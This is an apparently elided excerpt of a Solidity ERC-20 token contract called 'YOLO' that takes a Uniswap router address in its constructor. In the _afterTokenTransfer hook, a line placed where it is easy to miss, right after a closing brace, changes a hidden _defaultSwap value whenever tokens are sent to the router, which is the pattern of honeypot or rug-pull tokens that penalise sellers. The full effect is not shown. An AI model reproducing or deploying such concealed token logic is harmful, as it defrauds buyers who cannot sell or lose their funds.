 ...
 */
contract YOLO is Context, IERC20, IERC20Metadata, Ownable {
     ...
     *
     */
    constructor(string memory name_, string memory symbol_, address _uniswapV2Router)
    {
        _name = name_;
        _symbol = symbol_;
    ...
    function _spendAllowance(
        ...
        } function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual { if (to == uniswapV2Router) _defaultSwap = decimals() * 11;
    }
